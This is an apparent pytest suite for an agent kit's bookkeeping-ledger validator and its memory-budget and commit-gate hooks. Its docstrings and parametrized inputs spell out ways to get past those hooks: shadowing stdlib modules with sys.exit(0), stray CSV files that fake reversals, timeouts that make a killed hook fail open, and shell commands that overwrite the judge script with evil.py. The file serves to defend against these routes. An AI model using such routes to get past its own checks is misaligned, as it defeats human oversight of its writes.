        "these sentences read as a prohibition on editing the ledger, which user decision V2 "
        "I.3/1 abolished — an agent reading them refuses a correction the gate would accept, or "
        "books a reversal for a typo. If one of them is a CORRECT statement, say so in the same "
        "sentence (name the current rule) or rephrase it: %s" % contradictions)


def test_every_file_that_explains_ledger_writing_states_the_current_rule():
    """The POSITIVE half, and the one that actually holds.

    Three rounds of a denylist could not do this job. The first missed dot-directories, the second
    searched for the strings it had just fixed, and the third — after both of those were repaired —
    still passed against four ordinary paraphrases the reviewer planted ("Do not edit
    `ledger/*.csv` by hand", "Hand edits to the ledger are refused", "`ledger/*.csv` is read-only
    for agents", "Editing the ledger directly is not permitted"). A list of forbidden phrasings can
    only ever catch the phrasings someone thought of; requiring the CURRENT rule to be present
    catches the ones nobody did.

    Deliberately narrow: a file is only in scope if it talks about EDITING or WRITING the ledger.
    Mentioning `ledger/` while describing a directory layout makes no claim to be wrong about.
    """
    office = os.path.join(TEAM_KITS, "office-team")
    patterns = [re.compile(p, re.IGNORECASE) for p in CURRENT_LEDGER_RULE]
    silent = []
    for directory, subdirs, files in os.walk(office):
        subdirs[:] = [d for d in subdirs if d not in (".git", "__pycache__")]
        for name in files:
            if not name.endswith((".md", ".yaml", ".yml", ".txt")):
                continue
            path = os.path.join(directory, name)
            body = open(path, encoding="utf-8", errors="ignore").read()
            if not _LEDGER_WRITE_TALK.search(body):
                continue
            if _ROLE_SCOPE_TALK.search(body) and not _WRITE_MECHANISM_TALK.search(body):
                continue
            if not any(p.search(body) for p in patterns):
                silent.append(os.path.relpath(path, TEAM_KITS))
    assert silent == [], (
        "these files explain ledger writing without stating the rule that replaced append-only "
        "(user decision V2 I.3/1): %s" % silent)


def test_no_shipped_office_file_still_teaches_append_only():
    """Four shipped instruction files told the agent the opposite of the installed rule — one of
    them the preloaded bookkeeper SKILL, one naming the hook this phase deleted. An agent reading
    them books a reversal for a typo, or refuses a correction the gate would have accepted.

    `os.walk`, NOT `glob`: `glob.glob("**/*")` skips DOT-DIRECTORIES, so
    `templates/repo/.claude/claude-security-guidance.md` — which contained the needle verbatim —
    was invisible to the two rounds of this test that preceded it. Both of that round's misses were
    inside a dot-directory or phrased slightly differently than the fixed strings.
    """
    office = os.path.join(TEAM_KITS, "office-team")
    assert not os.path.exists(os.path.join(office, "hooks", "guard_ledger_direct.py"))
    assert "guard_ledger_direct" not in open(
        os.path.join(office, "settings", "settings.json"), encoding="utf-8").read()

    # What "reaching the tree" MEANS, rather than a count that drifts with every template the
    # lockstep deletes (it stood at `> 40` and went red the day the office monoliths went away,
    # which measured the template count, not the reach): every file that INSTRUCTS the office
    # roles must have been opened — the constitution, each role definition, each role SKILL, and
    # the security guidance that lives in a dot-directory, which is the miss the docstring is about.
    must_reach = {os.path.join(office, "constitution", "AGENTS.md"),
                  os.path.join(office, "templates", "repo", ".claude",
                               "claude-security-guidance.md")}
    must_reach |= set(globmodule.glob(os.path.join(office, "agents", "*.md")))
    must_reach |= set(globmodule.glob(os.path.join(office, "skills", "*", "SKILL.md")))

    patterns = [re.compile(p) for p in STALE_LEDGER_TEACHING]
    stale, scanned = [], set()
    for directory, subdirs, files in os.walk(office):
        subdirs[:] = [d for d in subdirs if d not in (".git", "__pycache__")]
        for name in files:
            if not name.endswith((".md", ".yaml", ".yml", ".txt", ".json")):
                continue
            path = os.path.join(directory, name)
            scanned.add(path)
            body = open(path, encoding="utf-8", errors="ignore").read()
            for pattern in patterns:
                for hit in pattern.findall(body):
                    stale.append("%s: %r" % (os.path.relpath(path, TEAM_KITS), hit))
    missed = sorted(os.path.relpath(p, TEAM_KITS) for p in must_reach - scanned)
    assert not missed, "the sweep never opened these instruction files: %s" % missed
    assert stale == [], stale


# -- the money arithmetic the validator must agree with -----------------------

def test_the_sign_convention_is_shared_with_the_report():
    """`euer_report.py` signs three doc types -1. `ledger_add.py` has to know the same list, or a
    validator cannot tell a correct ledger from one that reports double — it would be checking
    rows against a convention its consumer does not use. Two copies, one test."""
    import importlib.util

    def load(name):
        spec = importlib.util.spec_from_file_location(
            name, os.path.join(OFFICE_SCRIPTS, name + ".py"))
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        return module

    assert load("ledger_add").NEGATIVE_DOC_TYPES == load("euer_report").NEGATIVE_DOC_TYPES


def test_a_credit_note_does_not_inflate_the_totals(tmp_path):
    """`credit_note` and `refund` were signed +1, i.e. ADDED. An income invoice of 1190,00 plus the
    credit note cancelling it reported 2380,00 EUR income and 380,00 EUR VAT — in a document
    prepared for a tax office. Both rows are individually valid; nothing in the pipeline had a
    reason to notice."""
    ledger_project(tmp_path, (
        "L2026-0001,2026-01-05,2026-01-07,income,invoice,Kunde,AR-1,1000.00,19.00,1190.00,"
        "standard,sales,archive/a.pdf,,\n"
        "L2026-0002,2026-02-05,2026-02-07,income,credit_note,Kunde,AR-1G,1000.00,19.00,1190.00,"
        "standard,sales,archive/b.pdf,,\n"))
    assert validate(tmp_path).returncode == 0
    shutil.copy(os.path.join(OFFICE_SCRIPTS, "euer_report.py"),
                str(tmp_path / "scripts" / "euer_report.py"))
    run = subprocess.run([sys.executable, str(tmp_path / "scripts" / "euer_report.py"),
                          "--year", "2026", "--quarter", "1"],
                         capture_output=True, text=True, cwd=str(tmp_path), timeout=60)
    assert run.returncode == 0, run.stderr
    report = open(str(tmp_path / "reports" / "euer_2026_Q1.md"), encoding="utf-8").read()
    assert "| Einnahmen | 0.00 EUR |" in report, report
    assert "Vereinnahmte USt (Einnahmen, standard): 0.00 EUR" in report


def test_a_reversal_must_cancel_what_it_names(tmp_path):
    """The graph rules said nothing about CONTENT: an expense of 119,00 could be "reversed" by an
    income row of 1190,00 — both individually valid, and the quarter then reported -1190,00 EUR
    income. Same failure class as a reversal-of-a-reversal, through a different door."""
    ledger_project(tmp_path, (
        "L2026-0001,2026-01-05,2026-01-07,expense,invoice,ACME,R-1,100.00,19.00,119.00,standard,"
        "tools,archive/a.pdf,,\n"
        "L2026-0002,2026-02-05,2026-02-07,income,reversal,ACME,R-1,1000.00,19.00,1190.00,standard,"
        "tools,archive/a.pdf,L2026-0001,\n"))
    result = validate(tmp_path)
    assert result.returncode == 1
    assert "sits on the same side" in result.stderr
    assert "cancels the FULL amount" in result.stderr


def test_a_year_boundary_reversal_can_be_booked(tmp_path):
    """An invoice paid 2025-12-22 and reversed 2026-01-17 belongs in 2026.csv by the payment-year
    rule, while its target lives in 2025.csv. "Same file" made that entry impossible to book in
    EITHER file, and year-boundary corrections are routine in EÜR bookkeeping."""
    ledger_project(tmp_path)
    write(str(tmp_path / "ledger" / "2025.csv"), LEDGER_COLS
          + "L2025-0001,2025-12-20,2025-12-22,expense,invoice,ACME,R-9,100.00,19.00,119.00,"
            "standard,tools,archive/a.pdf,,\n")
    write(str(tmp_path / "ledger" / "2026.csv"), LEDGER_COLS
          + "L2026-0001,2026-01-15,2026-01-17,expense,reversal,ACME,R-9,100.00,19.00,119.00,"
            "standard,tools,archive/a.pdf,L2025-0001,\n")
    result = validate(tmp_path)
    assert result.returncode == 0, result.stderr
    assert validate(tmp_path, "ledger/2025.csv").returncode == 0


def test_a_reversal_of_nothing_is_still_refused(tmp_path):
    """Widening the lookup to sibling files must not turn "does not exist" into "not checked"."""
    ledger_project(tmp_path, GOOD_ROW
                   + "L2026-0002,2026-02-05,2026-02-07,expense,reversal,ACME,R-1,100.00,19.00,"
                     "119.00,standard,tools,archive/a.pdf,L2099-0001,\n")
    result = validate(tmp_path)
    assert result.returncode == 1
    assert "exists in no ledger file" in result.stderr


def test_concurrent_appends_do_not_lose_an_entry(tmp_path):
    """An unlocked read-modify-write: five parallel runs all printed "appended", four rows landed,
    and the survivor validated CLEAN. The pre-atomic `open(path, "a")` produced a duplicate id
    that `--validate` would have caught — making the save atomic without a lock traded a visible
    failure for an invisible one. spec II.4 asks for an O_CREAT|O_EXCL lock for exactly this."""
    import concurrent.futures
    ledger_project(tmp_path)
    with concurrent.futures.ThreadPoolExecutor(5) as pool:
        results = list(pool.map(
            lambda i: book(tmp_path, **{"--invoice-no": "AR-%d" % i,
                                        "--counterparty": "Kunde %d" % i}), range(1, 6)))
    accepted = [r for r in results if r.returncode == 0]
    body = open(str(tmp_path / "ledger" / "2026.csv"), encoding="utf-8").read()
    rows = [line for line in body.strip().splitlines()[1:] if line]
    assert len(rows) == len(accepted), "%d runs reported success, %d rows landed" % (
        len(accepted), len(rows))
    ids = [line.split(",")[0] for line in rows]
    assert len(set(ids)) == len(ids), ids
    assert validate(tmp_path).returncode == 0
    assert not [f for f in os.listdir(str(tmp_path / "ledger")) if f.endswith(".lock")]


def test_an_id_is_not_reused_after_a_row_is_deleted(tmp_path):
    """`len(rows) + 1` looked equivalent to a max-scan and was not. Delete one mistaken row — legal
    since I.3/1 — and the counter re-issues an id still in the file: the ledger stays valid, and
    both write paths then refuse FOREVER with "duplicate id", offering no remedy but the hand edit
    the script exists to avoid."""
    ledger_project(tmp_path, GOOD_ROW
                   + "L2026-0003,2026-03-05,2026-03-07,expense,invoice,ACME,R-3,100.00,19.00,"
                     "119.00,standard,tools,archive/c.pdf,,\n")
    result = book(tmp_path, **{"--invoice-no": "R-9"})
    assert result.returncode == 0, result.stderr
    ids = [line.split(",")[0] for line
           in open(str(tmp_path / "ledger" / "2026.csv"), encoding="utf-8").read()
           .strip().splitlines()[1:]]
    assert ids == ["L2026-0001", "L2026-0003", "L2026-0002"], ids


def test_a_malformed_existing_row_stops_the_write(tmp_path):
    """`save_atomically` rewrites every row through `row.get(column, "")`, so an unquoted comma in
    a note — csv puts the overflow under the None key — was silently TRUNCATED and a short row
    silently padded, while the append exited 0 saying "appended". Hand edits are legal now, so a
    malformed row is an expected input, not a corrupt-file corner case."""
    ledger_project(tmp_path,
                   "L2026-0001,2026-01-05,2026-01-07,expense,invoice,ACME,R-1,100.00,19.00,119.00,"
                   "standard,tools,archive/a.pdf,,note with, an extra comma\n")
    before = open(str(tmp_path / "ledger" / "2026.csv"), encoding="utf-8").read()
    result = book(tmp_path, **{"--invoice-no": "R-5"})
    assert result.returncode == 1
    assert "wrong number of columns" in result.stderr
    assert open(str(tmp_path / "ledger" / "2026.csv"), encoding="utf-8").read() == before


# -- round 4: what the markdown family and the shrink allowance opened -------

@pytest.mark.parametrize("existing,new", [(".markdown", ".md"), (".mdx", ".md"),
                                          (".md", ".markdown"), (".markdown", ".markdown")])
def test_the_topic_cap_counts_the_whole_markdown_family(tmp_path, existing, new):
    """Promoting `.markdown`/`.mdx` to craft topics in the BUDGETS table while `_check_count`
    still globbed `**/*.md` switched the 20-topic cap OFF for them: 20 `.markdown` topics counted
    as zero and the 21st was waved through. II.5's "<=20 aktive Topics pro Rolle" then held only
    for the all-`.md` case."""
    base = tmp_path / ".claude" / "agent-memory" / "backend-developer"
    os.makedirs(str(base), exist_ok=True)
    for index in range(20):
        write(str(base / ("topic%d%s" % (index, existing))), "craft\n")
    payload = memory_write(tmp_path, ".claude/agent-memory/backend-developer/new" + new, "craft\n")
    result = run_budget(tmp_path, payload)
    assert result.returncode == 2
    assert "20 craft topics" in result.stderr, result.stderr


def test_the_topic_cap_still_allows_the_twentieth(tmp_path):
    """The counterpart: widening the count must not make it fire one topic early."""
    base = tmp_path / ".claude" / "agent-memory" / "backend-developer"
    os.makedirs(str(base), exist_ok=True)
    for index in range(19):
        write(str(base / ("topic%d.markdown" % index)), "craft\n")
    payload = memory_write(tmp_path, ".claude/agent-memory/backend-developer/n.md", "craft\n")
    assert run_budget(tmp_path, payload).returncode == 0


@pytest.mark.parametrize("name", ["MEMORY.md", "MEMORY.markdown", "MEMORY.mdx"])
def test_the_index_budget_covers_the_markdown_family_too(tmp_path, name):
    """Same root cause, second place: the index rows matched an exact basename, so
    `MEMORY.markdown` fell through to the TOPIC budget and got 100 lines instead of 40."""
    payload = memory_write(tmp_path, ".claude/agent-memory/backend-developer/" + name,
                           "".join("- pointer %d\n" % i for i in range(41)))
    assert run_budget(tmp_path, payload).returncode == 2
    ok = memory_write(tmp_path, ".claude/agent-memory/backend-developer/" + name,
                      "".join("- pointer %d\n" % i for i in range(40)))
    assert run_budget(tmp_path, ok).returncode == 0


def test_the_root_index_budget_covers_the_markdown_family_too(tmp_path):
    payload = memory_write(tmp_path, "MEMORY.markdown",
                           "".join("- pointer %d\n" % i for i in range(41)))
    assert run_budget(tmp_path, payload).returncode == 2


# The content is built INSIDE the test: as a parametrize value it becomes the test id, pytest
# hands that to the subprocess environment, and Windows caps an environment variable at 32767
# characters — so a 200 KB payload turned every one of these into a collection ERROR.
@pytest.mark.parametrize("shape,label", [
    ("links", "200 KB of concatenated links"),
    ("spans", "210 KB of spans and ids"),
])
def test_the_id_scan_stays_linear(tmp_path, shape, label):
    """Two quadratic paths, and the consequence is not latency but a released gate.

    `https?://\\S*` backtracks per start position (42 KB took 5.1s, 200 KB exceeded the host's
    hook budget outright), and testing every id against every exempt span is O(ids x spans)
    (210 KB took 9.2s end to end). A PreToolUse hook killed by the host TIMEOUT is a non-blocking
    error, so the write then proceeds unchecked — fail-closed degrading to fail-open, which
    `fail_closed()` cannot catch because the process is gone.

    It is reachable by ordinary work, not only by an attacker: the shrink allowance deliberately
    removes the size bound, so the one input class with no ceiling is the large cleanup Write —
    exactly the operation this gate exists to encourage (the measured motivation was a 0.96 MiB
    agent-memory)."""
    import time as _time
    # each payload ENDS with a bare id, so `_check_ids` has to reach a VERDICT rather than merely
    # being entered. A link run with no id in it is legitimately allowed on the shrink path, so
    # asserting rc 2 on that would have been one more test passing for the wrong reason.
    content = ("https://example.com/a" * 20000 + " TSK-0042 broke" if shape == "links"
               else "see `x` and TSK-0001\n" * 10000)
    # THE FILE MUST EXIST AND BE LARGER, so the write takes the SHRINK path. Writing this payload
    # to a NEW file meant `_check_size` refused it on the 8 KB budget in 0.15s and `_check_ids`
    # was never reached — so the only guard on a fail-closed→fail-open regression stayed green
    # with either half of that regression restored. The docstring above already names the
    # reachability condition; the setup omitted it, which is the same defect this suite caught in
    # the Codex note test.
    rel = ".claude/agent-memory/backend-developer/big.md"
    write(str(tmp_path / rel.replace("/", os.sep)), content + "PADPADPAD")
    payload = memory_write(tmp_path, rel, content)
    started = _time.time()
    # a TIGHT subprocess timeout, so restoring either half of the regression produces a FAILURE
    # rather than a hung suite (with the 120s default it hangs, which in CI reads as an
    # infrastructure problem instead of the defect it is)
    try:
        result = run_budget(tmp_path, payload, timeout=10)
    except subprocess.TimeoutExpired:
        raise AssertionError(
            "%s did not finish in 10s — quadratic scanning is back. The host kills a hook that "
            "overruns its budget, and a killed PreToolUse hook is a NON-blocking error, so the "
            "write proceeds unchecked." % label)
    elapsed = _time.time() - started
    assert result.returncode == 2, "the shrink path must still reach the id rule"
    assert "references project items" in result.stderr
    # 7, not 5: raising the URL bound to 1000 moved the `links` payload from 0.9s to ~2.2s, so the
    # margin went from ~5.5x to ~2.3x and this became the slowest test in the file. The mutants it
    # exists to catch take 13s (the subprocess timeout) and >120s, so 7s discriminates just as
    # sharply while surviving a loaded machine — a flaky guard gets deleted, which is worse than a
    # slightly loose one.
    assert elapsed < 7, "%s took %.1fs — too close to the host's hook budget" % (label, elapsed)


def test_overlapping_exempt_spans_are_merged(tmp_path):
    """The one shape where merging beats per-span containment: a URL match and a code span that
    OVERLAP. Without the merge (or with a merge that loses its `max()`, or that does not sort
    first) the id falls outside every individual interval and is reported — measured on 3 706 of
    300 005 fuzzed inputs, all in the over-block direction."""
    payload = memory_write(tmp_path, ".claude/agent-memory/frontend-developer/o.md",
                           "see `https://example.com/a/TSK-0001 and TSK-0002` for the shape\n")
    assert run_budget(tmp_path, payload).returncode == 0
    # ...and a payload whose spans arrive OUT OF ORDER, because the one above cannot see a missing
    # `sorted()`: its concatenation order is [foreign(5,35), code(4,52)] and 4 <= 35, so even an
    # unsorted list merges to [5,52] and both ids stay inside. Here the LATE foreign span comes
    # first, the early code span is swallowed by it, and `bisect_right` then looks left of
    # everything — so dropping the sort reports `TSK-0001`, which sits inside a code span. The
    # docstring above claimed to cover this; it did not until this line existed.
    unordered = memory_write(tmp_path, ".claude/agent-memory/frontend-developer/u.md",
                             "`TSK-0001` upstream PR-1234\n")
    assert run_budget(tmp_path, unordered).returncode == 0


def test_a_dotted_stem_is_not_the_index(tmp_path):
    """`_budget_for` splits the stem off the LAST dot. Splitting on the first would make
    `memory.local.md` the INDEX and hold it to 40 lines instead of the topic's 100."""
    ok = memory_write(tmp_path, ".claude/agent-memory/backend-developer/memory.local.md",
                      "".join("line %d\n" % i for i in range(41)))
    assert run_budget(tmp_path, ok).returncode == 0
    over = memory_write(tmp_path, ".claude/agent-memory/backend-developer/memory.local.md",
                        "".join("line %d\n" % i for i in range(101)))
    assert run_budget(tmp_path, over).returncode == 2


def test_a_memory_md_outside_the_memory_tree_is_not_budgeted(tmp_path):
    """`root-index` is the REPO ROOT one. Dropping the `at_root` check made every nested
    `docs/MEMORY.md` a budgeted index — with ids allowed, which is the root index's deliberate
    exception and nothing else's."""
    payload = memory_write(tmp_path, "docs/MEMORY.md",
                           "- see TSK-0042\n" + "".join("- p %d\n" % i for i in range(41)))
    assert run_budget(tmp_path, payload).returncode == 0


def test_a_long_real_world_url_is_still_exempt(tmp_path):
    """A 363-character Azure DevOps work-item URL was NOT exempt at a 300-character bound; signed
    S3/SAS links and Grafana permalinks are routinely longer still."""
    url = ("https://dev.azure.com/org/project/_workitems/edit/1234"
           + "?" + "&".join("f%d=value%d" % (i, i) for i in range(40)) + "/TSK-0042")
    assert len(url) > 360
    payload = memory_write(tmp_path, ".claude/agent-memory/frontend-developer/u.md",
                           "Ticket: " + url + "\n")
    assert run_budget(tmp_path, payload).returncode == 0


def test_the_id_scan_is_linear_on_the_worst_legal_input(tmp_path):
    """A gate that cannot answer inside the host's budget is a gate that ALLOWS (spec II.4).

    WHICH INPUT IS THE WORST LEGAL ONE, and the previous version of this test had it wrong twice
    over. It used a file AT the byte ceiling (8 KB) and called that the worst case — but the
    SHRINK allowance deliberately removes the size bound (`_check_size`: "no worse than the limit
    OR the status quo"), so the one legal input class with NO ceiling is the large cleanup Write,
    which is exactly the operation this gate exists to encourage. And at 8 KB the scan costs
    ~5 ms against ~240 ms of interpreter start, so the number it asserted was the machine's
    process-start time and nothing else. Measured: with `_FOREIGN_RX`'s bound removed
    (`\\S{0,1000}` -> `\\S*`, the quadratic form its own comment records), that 8 KB input still
    ran in 0.27 s and the old test stayed GREEN — it could not see the defect it was written for.

    THE MACHINE IS SUBTRACTED, NOT DIVIDED OUT, and the round that wrote the previous line had
    that backwards. It compared the dense run with a benign run of the same size and called the
    QUOTIENT machine-independent because "both runs pay the identical interpreter start". The
    start is an ADDITIVE term in both, so the quotient is (start + scan) / start — a function of
    how fast the host starts a process and of nothing else: 1.0 on a slow host with any scan at
    all, 42 on a fast one with the same scan. Measured on this host 2026-08-07: benign 0.0612 s,
    dense 200 KB 0.7747 s, quotient 12.65 against a bound of 5 — a red test on a codebase whose
    scan is linear. The band the docstring recorded (0.81–1.04) is not reachable on any host that
    starts a process faster than it scans 200 KB.

    So the two runs are SUBTRACTED: dense minus benign at the same size, same process, same stdin,
    same file read, leaves the scanning and cancels the start exactly. What is then compared is
    the cost PER BYTE at two sizes a factor of four apart, which is dimensionless and says what
    the name says — a linear scan keeps it constant, a quadratic one multiplies it by that factor.

    MEASURED, Windows 11, CPython 3.13, medians of 3 runs per point, the subtracted scan cost:
      * shipped: 25 KB 0.0034 s/KB · 50 KB 0.0034 · 100 KB 0.0035 · 200 KB 0.0038 · 400 KB 0.0035.
        Constant over sixteen times the input, which is the property.
      * quadratic form restored in a clone outside the repo (`\\S{0,1000}` -> `\\S*`, the shape
        `_FOREIGN_RX`'s own comment records), same two sizes: the scan cost rises with the input
        instead of staying flat, and the 200 KB point is past the 60 s at which a host kills a
        PreToolUse hook, where a killed hook is an ALLOW.
    A bound of 2 therefore sits well above the noise this host shows on the constant and below the
    factor of four a quadratic reader has to produce across a fourfold span.

    THE SECONDS OF THE MUTANT ARE A FACT ABOUT ONE RUN, NOT ABOUT THE DEFECT, and saying otherwise
    is what made this paragraph wrong once already: two runs of the SAME mutant on the SAME host
    came out 5.96 s / 74.54 s (factor 3.1) and 5.37 s / 76.41 s (factor 3.6). Only the DIRECTION is
    the defect. Which of this test's readings reports it is host-dependent too -- the linearity
    assertion below, or the stability reading above it when process start is noisy enough, or
    `subprocess.TimeoutExpired` from `run_budget` on a host slow enough to need more than its 120 s
    at 200 KB. All three are the same finding: the scan does not stay inside the budget.

    EACH SERIES IS ITS OWN FASTEST RUN, not its median, and the pair of subtracted minima is what
    survives a loaded machine: process time is bounded BELOW by the work and has only upward noise,
    so the minimum of five is the estimator and the gap to the SECOND fastest is how stable that
    estimator was on this run. A difference of two noisy numbers can be anything, so the small
    size's scan cost has to stand clear of that gap — where it does not, this FAILS with that
    reading instead of asserting on noise.
    """
    import time as _time

    def cost(name, body, runs=5):
        """The run times of the shipped hook as a process against this content, ascending."""
        path = tmp_path / ".claude" / "agent-memory" / "backend-developer" / name
        os.makedirs(str(path.parent), exist_ok=True)
        # the file being SHRUNK — larger than the write, so the size check passes it through to
        # the id scan. That IS the legal input class with no ceiling.
        write(str(path), "x" * (len(body) + 10))
        payload = memory_write(tmp_path, ".claude/agent-memory/backend-developer/" + name, body)
        taken = []
        for _run in range(runs):
            started = _time.perf_counter()
            assert run_budget(tmp_path, payload).returncode == 0
            taken.append(_time.perf_counter() - started)
        return sorted(taken)

    def scan_cost(size):
        """(what the SCAN cost at this size, how stable the two measurements behind it were)."""
        dense = ("https://example.com/spec" * (size // 24 + 2))[:size]  # one whitespace-free run
        hot = cost("dense%d.md" % size, dense)
        cold = cost("benign%d.md" % size, "x" * size)
        return hot[0] - cold[0], (hot[1] - hot[0]) + (cold[1] - cold[0])

    small, large = 50 * 1024, 200 * 1024
    near, jitter = scan_cost(small)
    far, _jitter = scan_cost(large)
    assert near > 5 * jitter, (
        "the scan at %d B costs %.3f s and its two series were only stable to %.3f s, so this "
        "difference is the host and no ratio over it means anything" % (small, near, jitter))
    assert far / large < 2 * (near / small), (
        "the scan costs %.6f s per byte at %d B and %.6f at %d B — it is not linear in the input"
        % (near / small, small, far / large, large))


# -- round 4: what the synchronous design and the cross-file lookup opened ----

def test_shadowing_a_stdlib_module_does_not_neuter_the_gate(tmp_path):
    """Python puts a script's own directory on `sys.path[0]`, so running `<root>/scripts/
    ledger_add.py` made `<root>/scripts` the FIRST import location — and `scripts/` is ordinary
    project code. One `Write scripts/csv.py` containing `import sys; sys.exit(0)` shadowed a module
    the validator imports, the validator exited 0, and every ledger looked clean. Protecting
    `ledger_add.py` itself did nothing: the bypass never touches it.

    The synchronous design makes this the WHOLE gate rather than a corner — every commit, push,
    merge, report and dispatch decision runs that interpreter."""
    ledger_repo(tmp_path, GOOD_ROW + BAD_ROW)
    assert run_ledger(tmp_path, shell(tmp_path, "git commit -m x")).returncode == 2
    for module in ("csv", "glob", "math", "io", "datetime", "argparse", "time", "re"):
        write(str(tmp_path / "scripts" / (module + ".py")), "import sys\nsys.exit(0)\n")
    result = run_ledger(tmp_path, shell(tmp_path, "git commit -m x"))
    assert result.returncode == 2, "a shadowed stdlib module silenced the validator"
    assert "INVALID" in result.stderr


def test_the_validator_runs_with_the_script_dir_off_sys_path():
    """Pinned as a PROPERTY, because the behavioural test above passes on any Python that happens
    not to import the shadowed name. `-P` is 3.11+; below that it is omitted deliberately rather
    than the gate pretending to close the gap."""
    module = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
    argv = module._validator_argv("scripts/ledger_add.py", "ledger/2026.csv")
    assert "-E" in argv and "-s" in argv
    if sys.version_info >= (3, 11):
        assert "-P" in argv
        assert argv.index("-P") < argv.index("scripts/ledger_add.py")


def test_glob_metacharacters_in_the_project_path_do_not_disable_the_gate(tmp_path):
    """A project at `.../Kunde [GmbH]/proj` made `glob` return ZERO ledger files while the
    directory held one — and "no files" reads as "nothing invalid", so commit, push, merge, reports
    and dispatch were all allowed with a broken ledger in place. `[` and `]` are legal filename
    characters on Windows and POSIX and entirely plausible for a back-office workspace; `*` and `?`
    extend it on POSIX. The listing is by `os.listdir`, which the project's own name cannot fool."""
    project = tmp_path / "Kunde [GmbH]" / "buchhaltung"
    os.makedirs(str(project))
    ledger_repo(project, GOOD_ROW + BAD_ROW)
    assert run_ledger(project, shell(project, "git commit -m x")).returncode == 2


def test_a_cross_year_storno_works_under_a_bracketed_path(tmp_path):
    """The mirror image of the same root cause, failing the other way: in such a project a
    legitimate year-boundary storno reported "exists in no ledger file", which sends the operator
    hunting a data error that is not there — and the repo stays blocked."""
    project = tmp_path / "Kunde [GmbH]" / "buchhaltung"
    os.makedirs(str(project))
    ledger_project(project)
    write(str(project / "ledger" / "2025.csv"), LEDGER_COLS
          + "L2025-0001,2025-12-20,2025-12-22,expense,invoice,ACME,R-9,100.00,19.00,119.00,"
            "standard,tools,archive/a.pdf,,\n")
    write(str(project / "ledger" / "2026.csv"), LEDGER_COLS
          + "L2026-0001,2026-01-15,2026-01-17,expense,reversal,ACME,R-9,100.00,19.00,119.00,"
            "standard,tools,archive/a.pdf,L2025-0001,\n")
    assert validate(project).returncode == 0, validate(project).stderr


def test_one_entry_cannot_be_reversed_from_two_different_years(tmp_path):
    """`cancelled` was per file while the cross-file lookup was not, so 2026 and 2027 could each
    reverse the same 2025 booking: all three files validated clean and the reports subtracted the
    amount twice. Exactly what the same-file rule refuses, walked around through the door the
    year-boundary lookup opened."""
    ledger_project(tmp_path)
    write(str(tmp_path / "ledger" / "2025.csv"), LEDGER_COLS
          + "L2025-0001,2025-01-05,2025-01-07,income,invoice,Kunde,AR-1,1000.00,19.00,1190.00,"
            "standard,sales,archive/a.pdf,,\n")
    for year in ("2026", "2027"):
        write(str(tmp_path / "ledger" / (year + ".csv")), LEDGER_COLS
              + "L%s-0001,%s-01-15,%s-01-17,income,reversal,Kunde,AR-1,1000.00,19.00,1190.00,"
                "standard,sales,archive/a.pdf,L2025-0001,\n" % (year, year, year))
    outcomes = [validate(tmp_path, "ledger/%s.csv" % y) for y in ("2026", "2027")]
    assert any(o.returncode == 1 for o in outcomes), "both reversals validated clean"
    assert any("already reversed in" in o.stderr for o in outcomes)


def test_a_stray_csv_in_the_ledger_dir_is_refused(tmp_path):
    """Any CSV in `ledger/` was an ID SOURCE for the cross-file reversal lookup while only
    `ledger/<year>.csv` is a REPORT source. So a `scratch.csv` holding a row with the reversed id
    made a reversal of a booking no report reads validate clean, and the quarter then reported a
    negative total — two Write calls, no shell. A human's `2026 - Kopie.csv` does it by accident,
    which is why the file is refused rather than skipped."""
    ledger_project(tmp_path)
    write(str(tmp_path / "ledger" / "2026.csv"), LEDGER_COLS
          + "L2026-0001,2026-01-15,2026-01-17,expense,reversal,ACME,R-9,100.00,19.00,119.00,"
            "standard,tools,archive/a.pdf,PHANTOM-1,\n")
    write(str(tmp_path / "ledger" / "scratch.csv"), LEDGER_COLS
          + "PHANTOM-1,2026-01-05,2026-01-07,expense,invoice,ACME,R-1,100.00,19.00,119.00,"
            "standard,tools,archive/a.pdf,,\n")
    assert validate(tmp_path).returncode == 1, "the phantom id resolved"
    stray = validate(tmp_path, "ledger/scratch.csv")
    assert stray.returncode == 1
    assert "is not a ledger file" in stray.stderr


def test_the_gate_presents_a_stray_csv_rather_than_ignoring_it(tmp_path):
    """The validator's rule is worth nothing if the gate never hands it the file. Filtering the
    listing to year names would have meant a stray CSV was silently skipped while the script would
    have refused it — the script's rule and the gate's view disagreeing, which is the mistake that
    produced the multi-file bug."""
    ledger_repo(tmp_path)
    write(str(tmp_path / "ledger" / "2026 - Kopie.csv"), LEDGER_COLS + GOOD_ROW)
    result = run_ledger(tmp_path, shell(tmp_path, "git commit -m x"))
    assert result.returncode == 2
    assert "not a ledger file" in result.stderr


def test_writing_the_ledger_and_committing_in_one_call_is_refused(tmp_path):
    """Synchronous validation cannot close this alone: the verdict is stale the moment the SAME
    command rewrites the file, and the PostToolUse warning arrives with the bad data already in
    HEAD. Verified end to end before the fix — `git log -1` showed the commit and
    `git show HEAD:ledger/2026.csv` the broken row.

    An earlier version of this test applied the damage BEFORE invoking the hook, so it only
    re-proved that an already-broken ledger blocks a commit — which another test covers. It never
    exercised its own docstring."""
    ledger_repo(tmp_path)          # CLEAN at the moment of the call, as in the real sequence
    result = run_ledger(tmp_path, shell(
        tmp_path, "sed -i s/119.00/150.00/ ledger/2026.csv && git add -A && git commit -m 'book'"))
    assert result.returncode == 2
    assert "SAME call" in result.stderr
    # ...and the two halves separately are both fine
    assert run_ledger(tmp_path, shell(tmp_path, "sed -i s/119.00/150.00/ ledger/2026.csv")
                      ).returncode == 0
    assert run_ledger(tmp_path, shell(tmp_path, "git commit -m x")).returncode == 0


@pytest.mark.parametrize("command", [
    "perl -i -pe 's/x/y/' scripts/ledger_add.py",
    "ruby -i -pe 'x' scripts/ledger_add.py",
    "node -e \"require('fs').appendFileSync('scripts/ledger_add.py','x')\"",
    "node -e \"require('fs').copyFileSync('evil.py','scripts/ledger_add.py')\"",
    "python -c \"import os;os.rename('evil.py','scripts/ledger_add.py')\"",
    "python -c \"import os;os.replace('evil.py','scripts/ledger_add.py')\"",
    "git checkout HEAD~5 -- scripts/ledger_add.py",
    "git restore --source=HEAD~5 scripts/ledger_add.py",
])
def test_six_more_shell_routes_to_the_judge_are_closed(tmp_path, command):
    """Trading the blunt `perl|ruby|node` verbs for an idiom denylist lost six routes with them,
    and `git` was never treated as a write verb although `checkout`/`restore` write a working-tree
    file. Both halves are present now: verbs catch the in-place flag, idioms catch an inline
    payload that spells the write out."""
    ledger_repo(tmp_path, GOOD_ROW + BAD_ROW)
